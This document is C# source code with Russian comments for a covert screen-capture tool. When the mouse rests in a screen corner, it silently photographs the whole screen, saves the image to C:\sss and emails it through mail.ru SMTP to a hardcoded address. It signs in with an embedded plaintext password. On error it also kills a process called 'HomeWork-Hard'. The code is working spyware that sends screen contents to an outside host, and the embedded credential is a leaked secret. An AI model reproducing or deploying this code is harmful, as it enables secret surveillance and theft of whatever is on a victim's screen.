using System;
using System.Diagnostics;
using System.Drawing;
using System.Net; // Подключаем библиотеку для работы с сетью
using System.Net.Mail; // Из библиотеки подключаем класс для работы с почтой
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;

namespace YT1
{
    class Program
    {       
        static void Main(string[] args)
        {
            var procces = Process.GetProcessesByName("HomeWork-Hard");
            try
            {
                while (true)
                {
                    Thread.Sleep(2000);
                    GC.Collect();
                    var mousePosition = ShowMousePosition();
                    if (((mousePosition[0] == 1919) && (mousePosition[1] == 1079)) || ((mousePosition[0] == 2559) && (mousePosition[1] == 1439)))
                        ScreenShot();
                    //else if ((mousePosition[0] == 0) && (mousePosition[1] == 0))
                    //{
                    //    foreach (var proc in procces)
                    //    {
                    //        string dir = "C:\\sss";
                    //        Directory.Delete(dir, true);
                    //        proc.Kill();
                    //    }
                    //}
                    else
                        continue;
                }
            }
            catch 
            {
                foreach (var proc in procces)
                {
                    //string dir = "C:\\sss";
                    //Directory.Delete(dir, true);
                    proc.Kill();
                }
            }
                    
        }
        ///////////////////////--ОТПРАВКА ПИСЕМ--///////////////////////
        public static void SendMessage(string allName) // Метод для отправки сообщения
        {
            try // Обертка для обработки ошибок
            {
                MailAddress from = new MailAddress("slavegame.help@mail.ru", ""); // От кого отправляем Почта и Ник
                MailAddress to = new MailAddress("slavegame.help@mail.ru"); // Почта куда отправляем письма
                MailMessage m = new MailMessage(from, to); // Создаем объект сообщения
                m.IsBodyHtml = false; // Если используем HTML теги в сообщении ставим true, если только текст ставим false
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(allName);
                m.Attachments.Add(attachment);
                SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587); // Указываем хост и порт SMTP сервера с которого отправляем
                smtp.Credentials = new NetworkCredential("slavegame.help@mail.ru", "HI4v5scA1jOC9nrpfhIC"); // Данные почты с которой будет производится отправка сообщения
                smtp.EnableSsl = true; // SSL соединение если оно нужно для хоста
                smtp.Send(m); // Отправляем сообщение
            }
            catch // обработчик при ошибке
            {

            }
        }
        ///////////////////////------------------///////////////////////

        ///////////////////////--СКРИНШОТ ЭКРАНА--///////////////////////
        public static void ScreenShot()
        {
            String filename = "scr-" + DateTime.Now.ToString("hhmmss") + ".jpeg";
            int screenLeft = (int)SystemParameters.VirtualScreenLeft;
            int screenTop = (int)SystemParameters.VirtualScreenTop;
            int screenWidth = (int)SystemParameters.VirtualScreenWidth;
            int screenHeight = (int)SystemParameters.VirtualScreenHeight;

            Bitmap bitmap_Screen = new Bitmap(screenWidth, screenHeight);
            Graphics g = Graphics.FromImage(bitmap_Screen);

            g.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap_Screen.Size);

            string allName = "C:\\sss\\" + filename;
            bitmap_Screen.Save(allName);
            SendMessage(allName);
        }
        ///////////////////////-----------------///////////////////////

        ///////////////////////--ПРОВЕРКА КУРСОРА--///////////////////////
        static int _x, _y;
        static int[] ShowMousePosition()
        {           
            POINT point;
            if (GetCursorPos(out point))
            {
                var massive = new int[] { point.X, point.Y };
                return massive;
            }
            else { return null; }
        }

        public struct POINT
        {
            public int X;
            public int Y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out POINT lpPoint);   
        ///////////////////////------------------///////////////////////             
    }
}